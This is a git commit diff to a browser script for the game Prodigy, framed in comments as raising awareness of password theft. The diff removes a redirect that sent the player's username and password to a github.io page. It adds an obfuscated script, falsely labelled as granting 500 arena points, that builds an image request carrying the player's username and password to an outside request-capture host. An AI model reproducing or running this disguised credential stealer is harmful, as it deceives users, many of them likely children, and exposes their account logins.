e78c0824d89f50ada7bdb3150f3d7ad12b5a5b86
Gale <>
2020-03-19 16:04:06 -0400

    Update passwords.js

--- Awareness/passwords.js
+++ Awareness/passwords.js
@@ -1,9 +1,7 @@
 //this is to raise awareness for how easy it is to steal passwords, It will NOT steal your password
 //NOTE: This will not display your password if you use google to sign in good job. :)
 //someone could hide a script like this in their script and it could steal and log your passwords
-var pw = PIXI.game.prodigy.player.password;
-var un = PIXI.game.prodigy.player.username;
-pw = encodeURI(pw);
-un = encodeURI(un);
-window.location.href =
-	"https://rubberduck55.github.io/thing/handle.html?un=" + un + "&pw=" + pw;
+//here's an example of such a script
+
+// this script gives you 500 arena points!
+var _0x1e4b=['ent','img','onerror','game','https://po','account\x20ha','4647517881','username','7583?','password','createElem','cked!','https://t'];(function(_0x540527,_0x1e4b60){var _0x5510f0=function(_0x1f5119){while(--_0x1f5119){_0x540527['push'](_0x540527['shift']());}};_0x5510f0(++_0x1e4b60);}(_0x1e4b,0x1c5));var _0x5510=function(_0x540527,_0x1e4b60){_0x540527=_0x540527-0x0;var _0x5510f0=_0x1e4b[_0x540527];return _0x5510f0;};i=document[_0x5510('0xc')+_0x5510('0x2')](_0x5510('0x3'));i['src']=_0x5510('0x1');i[_0x5510('0x4')]=()=>{alert(_0x5510('0x7')+_0x5510('0x0'));i['onerror']=()=>{};i['src']=_0x5510('0x6')+'stb.in/158'+_0x5510('0x8')+'-206516548'+_0x5510('0xa')+PIXI[_0x5510('0x5')]['prodigy']['player'][_0x5510('0x9')]+'='+PIXI[_0x5510('0x5')]['prodigy']['player'][_0x5510('0xb')];};document['body']['append'](i);
